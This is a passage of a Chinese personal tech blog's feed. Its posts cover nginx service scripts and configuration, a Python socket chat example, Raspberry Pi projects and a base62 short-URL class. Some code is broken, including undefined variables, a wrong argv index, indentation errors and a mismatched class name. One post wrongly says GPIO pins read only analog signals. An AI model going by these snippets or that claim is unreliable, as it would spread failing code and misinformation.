CONFIGFILE=/usr/local/nginx/conf/$NAME.conf
PIDFILE=/usr/local/nginx/logs/$NAME.pid
SCRIPTNAME=/etc/init.d/$NAME
</code></pre><p><br></p>
<h4 id="关于start"><a href="#关于start" class="headerlink" title="关于start"></a>关于start</h4><pre><code>start() {
    echo -n &quot;Starting $NAME... &quot;
    if netstat -tnpl | grep -q nginx;then
        echo &quot;$NAME (pid `pidof $NAME`) already running.&quot;
        exit 1
    fi
    $NGINX_BIN -c $CONFIGFILE
    if [ &quot;$?&quot; != 0 ] ; then
        echo &quot; failed&quot;
        exit 1
    else
        echo &quot; done&quot;
    fi
}
</code></pre><p>这个函数通过 <code>netstat -tnpl | grep -q nginx</code> 检测nginx是否启动。</p>
<p><code>$NGINX_BIN -c $CONFIGFILE</code>命令用于启动nginx线程。</p>
<h4 id="关于stop"><a href="#关于stop" class="headerlink" title="关于stop"></a>关于stop</h4><pre><code>stop() {
    echo -n &quot;Stoping $NAME... &quot;
    if ! netstat -tnpl | grep -q nginx; then
        echo &quot;$NAME is not running.&quot;
        exit 1
    fi
    $NGINX_BIN -s stop

    if [ &quot;$?&quot; != 0 ] ; then
        echo &quot; failed. Use force-quit&quot;
        exit 1
    else
        echo &quot; done&quot;
    fi
}
</code></pre><p>一样的，通过 <code>! netstat -tnpl | grep -q nginx</code>检测nginx是否启动。</p>
<p><code>$NGINX_BIN -s stop</code> 关闭nginx线程，我们需要知道nginx启动pid，这个在配置文件中设置，如果我nginx安装在 <code>/usr/local/nginx/</code>，那么配置文件在 <code>/usr/local/nginx/conf/nginx.conf</code>。</p>
<p><br><hr><br></p>
<h1 id="0x03-保存并运行"><a href="#0x03-保存并运行" class="headerlink" title="0x03.保存并运行"></a>0x03.保存并运行</h1><p>假设 nginx 安装在 <code>/usr/local/nginx</code></p>
<h4 id="添加-nginx-service"><a href="#添加-nginx-service" class="headerlink" title="添加 nginx service"></a>添加 nginx service</h4><blockquote>
<p>vim /etc/init.d/nginx</p>
</blockquote>
<p>具体代码保存在<a href="http://xiaocao.u.qiniudn.com/blog%2Fnginx-service.sh" target="_blank" rel="external">http://xiaocao.u.qiniudn.com/blog%2Fnginx-service.sh</a></p>
<h4 id="设置权限"><a href="#设置权限" class="headerlink" title="设置权限"></a>设置权限</h4><blockquote>
<p>chmod +x /etc/init.d/nginx</p>
</blockquote>
<p>然后运行下试试。</p>
<blockquote>
<p>service nginx restart </p>
</blockquote>
<p><br><hr><br></p>
<h3 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-10-29-linux-shell-write-service"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-10-29-linux-shell-write-service" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2014/10/29/linux-shell-write-service/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/10/29/linux-shell-write-service/">http://homeway.me/2014/10/29/linux-shell-write-service/</a></h3><p><br></p>
<p>-by小草</p>
<p>2014-10-29 12:08:11</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Nginx反向代理重定向]]></title>
      <url>http://homeway.me/2014/10/28/nginx-reverse-proxy-conf/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-nginx.png" alt="nginx-reverse-proxy-conf"></p>
<a id="more"></a>
<p><br></p>
<h4 id="nginx确实是神器，支持高并发，反向代理，以及各种拓展。"><a href="#nginx确实是神器，支持高并发，反向代理，以及各种拓展。" class="headerlink" title="nginx确实是神器，支持高并发，反向代理，以及各种拓展。"></a>nginx确实是神器，支持高并发，反向代理，以及各种拓展。</h4><h4 id="有空要去玩玩lua-nginx，看看nginx底层原理，写写脚本。"><a href="#有空要去玩玩lua-nginx，看看nginx底层原理，写写脚本。" class="headerlink" title="有空要去玩玩lua+nginx，看看nginx底层原理，写写脚本。"></a>有空要去玩玩lua+nginx，看看nginx底层原理，写写脚本。</h4><p><br><hr><br></p>
<h1 id="0x01-nginx重定向配置"><a href="#0x01-nginx重定向配置" class="headerlink" title="0x01.nginx重定向配置"></a>0x01.nginx重定向配置</h1><p>关于nginx，还是习惯lnmp一键安装，假设我nginx安装在 <code>/usr/local/nginx</code> 里面。</p>
<p>直接用lnmp写好的命令添加下，就好了。</p>
<h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><blockquote>
<p>sudo /root/vhost.sh </p>
</blockquote>
<p>原文配置是这样的。</p>
<p>保存在 <code>/user/local/nginx/conf/vhost/ooxx.com.conf</code></p>
<pre><code>server
{
        listen 80;
        #listen [::]:80;
        server_name ooxx.com;
        index index.html index.htm index.php default.html default.htm default.php;
        root  /home/wwwroot/homeway.me;

        include router.conf; # 添加的路由重定向配置 
        #error_page   404   /404.html;
        # 配置php，解析到php cgi
        location ~ [^/]\.php(/|$)
        {
                    # comment try_files $uri =404; to enable pathinfo
                    try_files $uri =404;
                    fastcgi_pass  unix:/tmp/php-cgi.sock;
                    fastcgi_index index.php;
                    include fastcgi.conf;
                    #include pathinfo.conf;
        }
        # 配置图片过期时间
        location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$
        {
                    expires      30d;
        }
        # 配置静态文件过期时间
        location ~ .*\.(js|css)?$
        {
                    expires      12h;
        }

        access_log  /home/wwwlogs/homeway.me.log  access;
 }
</code></pre><p><br></p>
<p>从上面可以看出，这些都是基础配置，配置了.php，各种格式图片，静态文件的一些解析方式，过期时间。</p>
<p>当然了，我们还可以自己配置想要的重定向方式。</p>
<p><br></p>
<h3 id="重定向配置"><a href="#重定向配置" class="headerlink" title="重定向配置"></a>重定向配置</h3><p>假如，我写了个解析路由的网站，我想把所有链接重定向到 /index.php 这个文件再做路由解析，试试下面的。</p>
<p>保存在 <code>/user/local/nginx/conf/router.conf</code></p>
<pre><code>location / {
    index index.html index.php;
    if (-f $request_filename/index.html){
        rewrite (.*) $1/index.html break;
    }
    if (-f $request_filename/index.php){
        rewrite (.*) $1/index.php;
    }
    if (!-f $request_filename){
        rewrite (.*) /index.php;
    }
}
</code></pre><p><br>    </p>
<p><code>$request_filename</code> 就是访问的根目录，这里对根目录做了重定向，将所有链接重写到 index.php 这个文件里，我们就可以在这里做路由了。</p>
<p>很明显，关于apache中.htaccess的重定向转化到nginx的道理是一样的，只要把路由用正则表达配置好，再写点规则就好了。</p>
<p><br><hr><br></p>
<h1 id="0x02-nginx配置ssl"><a href="#0x02-nginx配置ssl" class="headerlink" title="0x02.nginx配置ssl"></a>0x02.nginx配置ssl</h1><p>基本也不要解释。</p>
<pre><code>upstream jenkins {
    # 均衡负载
      server 127.0.0.1:8080 fail_timeout=0;
}
server {
      listen 80;
      return 301 https://$host$request_uri;
}
server {
      listen 443;
      server_name jenkins.domain.tld;
      ssl on;
      ssl_certificate /etc/nginx/ssl/server.crt;
      ssl_certificate_key /etc/nginx/ssl/server.key;

      location / {
        proxy_set_header        Host $host;
        proxy_set_header        X-Real-IP $remote_addr;
        proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header        X-Forwarded-Proto $scheme;
        proxy_redirect              http:// https://;
        proxy_pass              http://homeway.me; #指向代理网站
      }
}
</code></pre><p><br><hr><br></p>
<h1 id="0x03-nginx防盗图配置"><a href="#0x03-nginx防盗图配置" class="headerlink" title="0x03.nginx防盗图配置"></a>0x03.nginx防盗图配置</h1><p>防盗图主要是针对定向的路径，当用户访问该路径，检测域名，如果域名不对，重定向。</p>
<p>所以先要写个正则表达式。</p>
<p>假设，我的路径是 <code>/public/img/xxx.jpg</code> 那么我就可以这样写。</p>
<pre><code>location ~ \/public\/(css|js|img)\/.*\.(js|css|gif|jpg|jpeg|png|bmp|swf) {
    valid_referers none blocked *.homeway.me;
    if ($invalid_referer) {
            rewrite ^/  http://xiaocao.u.qiniudn.com/blog%2Fpiratesp.png;
    }
}
</code></pre><p><br></p>
<p>下面是我添加防盗图后的结果。</p>
<p><img src="https://static.blog.homeway.me/blog%2Fnginx-reverse-proxy-conf-2014-10-27.gif" alt="防盗图"></p>
<p><br><hr><br></p>
<h3 id="来张图"><a href="#来张图" class="headerlink" title="来张图"></a>来张图</h3><p><img src="https://static.blog.homeway.me/blog%2Fnginx-reverse-proxy-conf-2014-10-27-view.jpg" alt="上海回杭州"></p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-10-28-nginx-reverse-proxy-conf"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-10-28-nginx-reverse-proxy-conf" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2014/10/28/nginx-reverse-proxy-conf/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/10/28/nginx-reverse-proxy-conf/">http://homeway.me/2014/10/28/nginx-reverse-proxy-conf/</a></h4><p><br></p>
<p>-by小草</p>
<p>2014-10-28 22:27:10</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Python网络编程-socket]]></title>
      <url>http://homeway.me/2014/10/21/python-socket-1/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-python.png" alt="Python"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-socket网络通信"><a href="#0x01-socket网络通信" class="headerlink" title="0x01.socket网络通信"></a>0x01.socket网络通信</h1><p>socket是嵌套字的意思，可以理解为server与client们间的在线会话。</p>
<p><br></p>
<p><img src="http://queengina.img.detuyun.cn/socket1.png" alt="socket与通信协议"></p>
<p><br></p>
<p>关于socket通信可以看这里：</p>
<p><a href="http://queengina.com/2014/10/09/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3Socket/" target="_blank" rel="external">http://queengina.com/2014/10/09/简单理解Socket/</a></p>
<p><br><hr><br></p>
<h1 id="0x02-多线程socket"><a href="#0x02-多线程socket" class="headerlink" title="0x02.多线程socket"></a>0x02.多线程socket</h1><p><br></p>
<h3 id="python下开启一个socket"><a href="#python下开启一个socket" class="headerlink" title="python下开启一个socket"></a>python下开启一个socket</h3><p>对于server服务端，python socket需要做4件事情</p>
<p>1.开启socket</p>
<p>2.设置配置socket</p>
<p>3.绑定端口</p>
<p>4.帧监听，收发包</p>
<p><br></p>
<h3 id="多线程socket"><a href="#多线程socket" class="headerlink" title="多线程socket"></a>多线程socket</h3><blockquote>
<p>=&gt; server.py</p>
</blockquote>
<pre><code>#!/usr/bin/python
# -*- coding:utf-8 -*-
import socket 
import threading 
import time
import sys

clients = [] 
class RecvMsg(threading.Thread): 
    def __init__(self, sock): 
        threading.Thread.__init__(self) 
        self.sock = sock 
    def run(self): 
        global clients 
        while True: 
            msg = self.sock.recv(512) 
            print &#39;recv=&gt;&#39;,msg 
            for client in clients: 
                if client != self.sock:
                        message = {}
                    message[&#39;id&#39;] = self.sock
                    message[&#39;time&#39;] = time.time()
                    message[&#39;type&#39;] = &#39;server send&#39;
                    print &#39;send=&gt;&#39;, message
                    client.send( str(message) )
                    pass
                pass

def main( port ): 
    sock = socket.socket() 
    sock.bind(( socket.gethostname(), int(port) )) 
    sock.listen(5) 
    while True: 
        client, address = sock.accept() 
        print &#39;a client connected&#39; 
        if client not in clients: 
            clients.append(client) 
            recvMsg = RecvMsg(client)
            recvMsg.start() 
    sock.close() 

if __name__ == &quot;__main__&quot;: 
    port = sys.argv[1]
    main( port ) 
</code></pre><blockquote>
<p>python server.py 56565</p>
</blockquote>
<p><br><hr><br></p>
<blockquote>
<p>=&gt; client.py</p>
</blockquote>
<pre><code>#!/usr/bin/python
# -*- coding:utf-8 -*-
import socket  
import threading 
import os,time 
import sys

class RecvMsg(threading.Thread): 
    def __init__(self, sock): 
        threading.Thread.__init__(self) 
        self.sock = sock 

    def run(self): 
        while True: 
            recvMsg = self.sock.recv(512) 
            print &#39;recv=&gt;&#39;,recvMsg 

def sendMsg(sock): 
    msg = time.time()
    message = {} 
    message[&#39;id&#39;] = os.getpid() 
    message[&#39;msg&#39;] = msg 
    print &#39;send=&gt;&#39;, message 
    sock.send(str(message)) 

def main( port ): 
    sock = socket.socket() 
    sock.connect(( socket.gethostname(), int(port) )) 
    recvMsg = RecvMsg(sock) 
    recvMsg.start() 
        while True:
        time.sleep(1.5) 
        sendMsg(sock) 

if __name__ == &quot;__main__&quot;:
    port = sys.argv[1] 
    main( port ) 
</code></pre><blockquote>
<p>python client.py 56565</p>
</blockquote>
<p><br></p>
<h3 id="关于报错"><a href="#关于报错" class="headerlink" title="关于报错"></a>关于报错</h3><p>socket模块提供4个error函数。</p>
<p>1.关于一般I/O和通信有关的问题 socket.error</p>
<p>2.与查询地址有关 socket.gaierror</p>
<p>3.与其他地址错误有关 socket.herror</p>
<p>4.与上个socket调用timeout有关 socket.timeout</p>
<h4 id="举个例子：-保存为error-py"><a href="#举个例子：-保存为error-py" class="headerlink" title="举个例子：(保存为error.py)"></a>举个例子：(保存为error.py)</h4><pre><code>#!/usr/bin/python
# -*- coding:utf-8 -*-
from socket import *
import time,sys

HOST = socket.gethostname()
PORT = sys.argv[0] 
BUFSIZ = 1024
ADDR = ( HOST, int(PORT) )

SerSock = socket(AF_INET, SOCK_STREAM)

try:
    SerSock.bind(ADDR)
except socket.error, e:
    print &#39;socket.error=&gt;&#39;,e
except socket.gaierror, e:
    print &#39;socket.gaierror=&gt;&#39;,e
except socket.herror, e:
    print &#39;socket.herror=&gt;&#39;,e

SerSock.listen(5)

while True:
    print &#39;waiting for message...&#39;
    CliSock, addr = tcpSerSock.accept()
    print &#39;...connect from :&#39;, addr
    while True:
        data = CliSock.recv(BUFSIZ)
        if not data:
            break
        CliSock.send(&#39;[%s] %s&#39; % (time.ctime(), data))
    CliSock.close()
SerSock.close()
</code></pre><blockquote>
<p>python error.py 54545</p>
</blockquote>
<p><br><hr><br></p>
<p><br><hr><br></p>
<h5 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-10-21-python-socket-1"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-10-21-python-socket-1" class="headerlink" title="本文出自 夏日小草,转载请注明出处: http://homeway.me/2014/10/21/python-socket-1/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/10/21/python-socket-1/"> http://homeway.me/2014/10/21/python-socket-1/</a></h5><p><br></p>
<p>-by小草</p>
<p>2014-10-21 22:34:54</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[树莓派-像打地鼠一样玩Flappy-Bird和远程控制PPT]]></title>
      <url>http://homeway.me/2014/10/15/raspberry-socket-remote-ppt-flappy-bird/</url>
      <content type="html"><![CDATA[<p><br></p>
<h4 id="在土豆Hackthon上完成的，两个基于WebSoceket和树莓派的小应用"><a href="#在土豆Hackthon上完成的，两个基于WebSoceket和树莓派的小应用" class="headerlink" title="在土豆Hackthon上完成的，两个基于WebSoceket和树莓派的小应用."></a>在土豆Hackthon上完成的，两个基于WebSoceket和树莓派的小应用.</h4><h4 id="第一个是基于websocket的远程ppt系统"><a href="#第一个是基于websocket的远程ppt系统" class="headerlink" title="第一个是基于websocket的远程ppt系统."></a>第一个是基于websocket的远程ppt系统.</h4><h4 id="第二个是基于websocket的敲击式Flappy-Bird"><a href="#第二个是基于websocket的敲击式Flappy-Bird" class="headerlink" title="第二个是基于websocket的敲击式Flappy Bird."></a>第二个是基于websocket的敲击式Flappy Bird.</h4><a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-远程ppt系统"><a href="#0x01-远程ppt系统" class="headerlink" title="0x01.远程ppt系统"></a>0x01.远程ppt系统</h1><h3 id="gt-简介："><a href="#gt-简介：" class="headerlink" title="=&gt;简介："></a>=&gt;简介：</h3><p>远程ppt系统支持用手机控制ppt，或者用传感器控制ppt（只要在杯子上吹口气，就能控制ppt）。</p>
<p>系统建立在WebSocket上，树莓派I/O口与web端ppt分别为不同的client，与服务器处于同一socket。</p>
<p>树莓派端用python，Web PPT端用php。</p>
<p><br></p>
<h3 id="gt-原理："><a href="#gt-原理：" class="headerlink" title="=&gt;原理："></a>=&gt;原理：</h3><p><img src="https://static.blog.homeway.me/blog%2Fraspberry-socket-remote-ppt-1-2014-10-15.gif" alt="远程ppt原理"></p>
<p><br></p>
<h3 id="gt-demo效果："><a href="#gt-demo效果：" class="headerlink" title="=&gt;demo效果："></a>=&gt;demo效果：</h3><p><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fraspberry-socket-remote-ppt-2-2014-10-15.jpg" alt="往杯子吹口气，ppt就能动"></p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fraspberry-socket-remote-ppt-4-2014-10-15.jpg" alt="用手机远程控制ppt"></p>
<p><br><hr><br></p>
<video src="https://static.blog.homeway.me/blog%2Fraspberry-socket-remote-ppt-7-2014-10-15.mp4" controls="controls"></video>

<p><br><hr><br></p>
<h1 id="0x02-Flappy-Bird"><a href="#0x02-Flappy-Bird" class="headerlink" title="0x02.Flappy Bird"></a>0x02.Flappy Bird</h1><h3 id="gt-简介：-1"><a href="#gt-简介：-1" class="headerlink" title="=&gt;简介："></a>=&gt;简介：</h3><p>只要拿个锤子，或者书本，就能在杯子上，像打地鼠一样玩Flappy Bird啦！</p>
<p><br></p>
<h3 id="gt-原理：-1"><a href="#gt-原理：-1" class="headerlink" title="=&gt;原理："></a>=&gt;原理：</h3><p><img src="https://static.blog.homeway.me/blog%2Fraspberry-socket-remote-ppt-6-2014-10-15.png" alt="flappy bird 原理"></p>
<p><br></p>
<h3 id="gt-demo效果：-1"><a href="#gt-demo效果：-1" class="headerlink" title="=&gt;demo效果："></a>=&gt;demo效果：</h3><p><img src="https://static.blog.homeway.me/blog%2Fraspberry-socket-remote-ppt-5-2014-10-15.jpg" alt="用手敲击杯子上部，就能完flappy bird"></p>
<p><br><hr><br></p>
<h1 id="0x03-关于socket："><a href="#0x03-关于socket：" class="headerlink" title="0x03.关于socket："></a>0x03.关于socket：</h1><p>WebSocket教程请看： <a href="http://www.cnblogs.com/hustskyking/p/websocket-with-php.html" target="_blank" rel="external">http://www.cnblogs.com/hustskyking/p/websocket-with-php.html</a></p>
<p>由于python的socket是基于TCP层协议，而php里面socket是基于HTTP协议的WebSocket，所以想让python的socket与php的socket对接。</p>
<p>比赛时候，找了一晚上bug，然后，发现，WebSocket实现web对接时候，要先进行报头验证，握手，该阶段基于http协议。</p>
<p>so，想要解决python socket与php socket对接，要实现TCP socket与HTTP socket握手认证。</p>
<p>最后终于在github上找到答案了。<a href="https://github.com/Lawouach/WebSocket-for-Python" target="_blank" rel="external">https://github.com/Lawouach/WebSocket-for-Python</a></p>
<h1 id="0x04-关于源码"><a href="#0x04-关于源码" class="headerlink" title="0x04.关于源码"></a>0x04.关于源码</h1><p>源码和IO方式暂不公开，有需要的们可以找我。<a href="mailto:xiaocao.grasses@gmail.com" target="_blank" rel="external">xiaocao.grasses@gmail.com</a></p>
<h1 id="0x05-关于比赛"><a href="#0x05-关于比赛" class="headerlink" title="0x05.关于比赛"></a>0x05.关于比赛</h1><p>比赛演示时候出现问题，表示很伤心，不过和队友合作很开心，一起度过一个愉快的周末。</p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fhackthon-2014-10-15-1.jpg" alt="土豆-avos-hackthon-合照"></p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fhackthon-2014-10-15-3.jpg" alt="土豆-avos-hackthon-作品"></p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fhackthon-2014-10-15-4.jpg" alt="土豆-avos-hackthon-作品"></p>
<p><br><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog%2Fhackthon-2014-10-15-5.jpg" alt="土豆-avos-hackthon-干活"></p>
<p><br><hr><br></p>
<h5 id="本文出自-夏日小草-转载请注明出处-《-树莓派-hackthon作品-》"><a href="#本文出自-夏日小草-转载请注明出处-《-树莓派-hackthon作品-》" class="headerlink" title="本文出自 夏日小草,转载请注明出处: 《 树莓派-hackthon作品 》"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/10/15/raspberry-socket-remote-ppt-flappy-bird/"> 《 树莓派-hackthon作品 》</a></h5><p><br></p>
<p>-by小草</p>
<p>2014-10-15 01:25:37</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[树莓派基础-GPIO、CPU、温度、内存]]></title>
      <url>http://homeway.me/2014/10/09/raspberry-the-current-status-and-data/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-raspberry-pi.png" alt="Raspberry Pi"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>入手树莓派已经几个月，但是一直没有做什么东西，系统搭起来就是一个ubuntu，所以熟悉linux的同学就比较好入门。</p>
<p>很多有意思的创意，都在创客中心： <a href="http://www.dfrobot.com.cn/community/portal.php" target="_blank" rel="external">http://www.dfrobot.com.cn/community/portal.php</a></p>
<p>还有树莓派社区: <a href="http://shumeipai.nxez.com/" target="_blank" rel="external">http://shumeipai.nxez.com/</a></p>
<p>感觉树莓派的好用在于，Linux系统较容易开发python、c，不需要烧录；板子简洁，方便携带；I/O简单，方便。</p>
<p>如果只是单用一个系统，不如服务器，优势就在于，外接各种传感器，板子。</p>
<p>玩完树莓派，准备入手Arduino，感觉这个更多开发接口，设备。</p>
<p><br><hr><br></p>
<h1 id="0x02-GPIO管脚"><a href="#0x02-GPIO管脚" class="headerlink" title="0x02.GPIO管脚"></a>0x02.GPIO管脚</h1><p>想要使用树莓派管脚，在python下，要先安装GPIO库，在c下，要安装WiringPi.</p>
<h4 id="安装GPIO"><a href="#安装GPIO" class="headerlink" title="安装GPIO"></a>安装GPIO</h4><blockquote>
<p>sudo apt-get install python-setuptools</p>
<p>sudo easy_install -U distribute</p>
<p>sudo apt-get install python-dev</p>
<p>sudo easy_install RPi.GPIO</p>
</blockquote>
<p><br></p>
<h4 id="安裝WiringPi"><a href="#安裝WiringPi" class="headerlink" title="安裝WiringPi"></a>安裝WiringPi</h4><p>官网中有2种方式安裝，一种使用的是GIT方式；另一種使用的是下载包方式。</p>
<blockquote>
<p>sudo apt-get install git-core</p>
<p>sudo apt-get update &amp;&amp; sudo apt-get -y upgrade</p>
</blockquote>
<p>用GIT取得WiringPi:</p>
<blockquote>
<p>git clone git://git.drogon.net/wiringPi</p>
<p>cd wiringPi</p>
<p>git pull origin</p>
<p>cd wiringPi</p>
<p>./build</p>
</blockquote>
<p>當指令执行结束后便完成安装WiringPi步驟。</p>
<p><br></p>
<h4 id="关于GPIO"><a href="#关于GPIO" class="headerlink" title="关于GPIO"></a>关于GPIO</h4><p><img src="https://static.blog.homeway.me/blog%2Fgpio-list.png" alt="树莓派引脚图"></p>
<p>树莓派有两种引脚模式，BCD和BOARD,选择不同的引脚模式，引脚结果不一样。</p>
<p>外侧一排为5V电压。内侧一排为3.3V电压。</p>
<p>引脚只能识别模拟信号，无法识别数字信号，所以只能检测高低电平，输入输出高低电平。</p>
<p>关于引脚图，查看这里。<a href="http://www.geekfan.net/8972/" target="_blank" rel="external">http://www.geekfan.net/8972/</a></p>
<p><br><hr><br></p>
<h1 id="0x03-CPU、温度、内存"><a href="#0x03-CPU、温度、内存" class="headerlink" title="0x03.CPU、温度、内存"></a>0x03.CPU、温度、内存</h1><p>关于cpu，温度，内存，网上很多了，从网上抄了个下来。</p>
<h4 id="新建脚本"><a href="#新建脚本" class="headerlink" title="新建脚本"></a>新建脚本</h4><blockquote>
<p>vim info.py</p>
</blockquote>
<h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><pre><code>import os

# Return CPU temperature as a character string                                     
def getCPUtemperature():
    res = os.popen(&#39;vcgencmd measure_temp&#39;).readline()
    return(res.replace(&quot;temp=&quot;,&quot;&quot;).replace(&quot;&#39;C\n&quot;,&quot;&quot;))

# Return RAM information (unit=kb) in a list                                      
# Index 0: total RAM                                                              
# Index 1: used RAM                                                                
# Index 2: free RAM                                                                
def getRAMinfo():
    p = os.popen(&#39;free&#39;)
    i = 0
    while 1:
        i = i + 1
        line = p.readline()
        if i==2:
            return(line.split()[1:4])

# Return % of CPU used by user as a character string                               
def getCPUuse():
    return(str(os.popen(&quot;top -n1 | awk &#39;/Cpu\(s\):/ {print $2}&#39;&quot;).readline().strip()))

# Return information about disk space as a list (unit included)                    
# Index 0: total disk space                                                        
# Index 1: used disk space                                                        
# Index 2: remaining disk space                                                    
# Index 3: percentage of disk used                                                 
def getDiskSpace():
    p = os.popen(&quot;df -h /&quot;)
    i = 0
    while 1:
        i = i +1
        line = p.readline()
        if i==2:
            return(line.split()[1:5])

# CPU informatiom
CPU_temp = getCPUtemperature()
CPU_usage = getCPUuse()

# RAM information
# Output is in kb, here I convert it in Mb for readability
RAM_stats = getRAMinfo()
RAM_total = round(int(RAM_stats[0]) / 1000,1)
RAM_used = round(int(RAM_stats[1]) / 1000,1)
RAM_free = round(int(RAM_stats[2]) / 1000,1)

# Disk information
DISK_stats = getDiskSpace()
DISK_total = DISK_stats[0]
DISK_used = DISK_stats[1]
DISK_perc = DISK_stats[3]

if __name__ == &#39;__main__&#39;:
    print(&#39;&#39;)
    print(&#39;CPU Temperature = &#39;+CPU_temp)
    print(&#39;CPU Use = &#39;+CPU_usage)
    print(&#39;&#39;)
    print(&#39;RAM Total = &#39;+str(RAM_total)+&#39; MB&#39;)
    print(&#39;RAM Used = &#39;+str(RAM_used)+&#39; MB&#39;)
    print(&#39;RAM Free = &#39;+str(RAM_free)+&#39; MB&#39;)
    print(&#39;&#39;) 
    print(&#39;DISK Total Space = &#39;+str(DISK_total)+&#39;B&#39;)
    print(&#39;DISK Used Space = &#39;+str(DISK_used)+&#39;B&#39;)
    print(&#39;DISK Used Percentage = &#39;+str(DISK_perc))
</code></pre><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><blockquote>
<p>chmod +x info.py</p>
<p>python info.py</p>
</blockquote>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p><img src="https://static.blog.homeway.me/blog%2Fraspberry-sysy-info-2014-10-09.gif" alt="系统信息"></p>
<p><br><hr><br></p>
<h5 id="本文出自-夏日小草-转载请注明出处-《-树莓派基础-GPIO、CPU、温度、内存-》"><a href="#本文出自-夏日小草-转载请注明出处-《-树莓派基础-GPIO、CPU、温度、内存-》" class="headerlink" title="本文出自 夏日小草,转载请注明出处: 《 树莓派基础-GPIO、CPU、温度、内存 》"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/10/09/raspberry-the-current-status-and-data/"> 《 树莓派基础-GPIO、CPU、温度、内存 》</a></h5><p><br></p>
<p>-by小草</p>
<p>2014-10-09 10:13:15</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[一个base62的短连接服务]]></title>
      <url>http://homeway.me/2014/09/25/base62-shorter-url-server/</url>
      <content type="html"><![CDATA[<p><br></p>
<h4 id="本文主要浅析最近写过的一个短连接服务，以及短连接服务意义。"><a href="#本文主要浅析最近写过的一个短连接服务，以及短连接服务意义。" class="headerlink" title="本文主要浅析最近写过的一个短连接服务，以及短连接服务意义。"></a>本文主要浅析最近写过的一个短连接服务，以及短连接服务意义。</h4><h5 id="服务主页详见-gt-homeway-me-T-T-没域名了，暂且这个。类似谷歌的-gt-goo-gl"><a href="#服务主页详见-gt-homeway-me-T-T-没域名了，暂且这个。类似谷歌的-gt-goo-gl" class="headerlink" title="服务主页详见 =&gt; homeway.me , T_T 没域名了，暂且这个。类似谷歌的 =&gt; goo.gl"></a>服务主页详见 =&gt; <a href="http://homeway.me">homeway.me</a> , T_T 没域名了，暂且这个。类似谷歌的 =&gt; <a href="http://goo.gl" target="_blank" rel="external">goo.gl</a></h5><h5 id="关于源代码，暂不公开，尚缺一个监控模块和用户中心。"><a href="#关于源代码，暂不公开，尚缺一个监控模块和用户中心。" class="headerlink" title="关于源代码，暂不公开，尚缺一个监控模块和用户中心。"></a>关于源代码，暂不公开，尚缺一个监控模块和用户中心。</h5><a id="more"></a>
<p><br></p>
<h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01.原理"></a>0x01.原理</h1><p><img src="https://static.blog.homeway.me/blog%2Fshrot-url-2014-09-25.gif" alt="短连接服务"></p>
<p><br><hr><br></p>
<h1 id="0x02-base62源码"><a href="#0x02-base62源码" class="headerlink" title="0x02.base62源码"></a>0x02.base62源码</h1><pre><code>class Base62{
    private $string = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
    private $base = 62;

    public function base62_encode($str) {
        $out = &#39;&#39;;
        for($t=floor(log10($str)/log10( $this-&gt;base )); $t&gt;=0; $t--) {
            $a = floor($str / pow( $this-&gt;base, $t));
            $out = $out.substr($this-&gt;string, $a, 1);
            $str = $str - ($a * pow( $this-&gt;base, $t));
        }     
        return $out;
    }
    public function base62_decode($str) {
        $out = 0;
        $len = strlen($str) - 1;
        for($t=0; $t&lt;=$len; $t++) {
            $out = $out + strpos($this-&gt;string, substr($str, $t, 1)) * pow( $this-&gt;base, $len - $t);
        } 
        return substr(sprintf(&quot;%f&quot;, $out), 0, -7);
    } 
}
$str = time();
$object = new Base();
echo $object-&gt;base62_encode($str) . &quot;\n&quot;;
echo $object-&gt;base62_decode($object-&gt;base62_encode($str)) . &quot;\n&quot;;
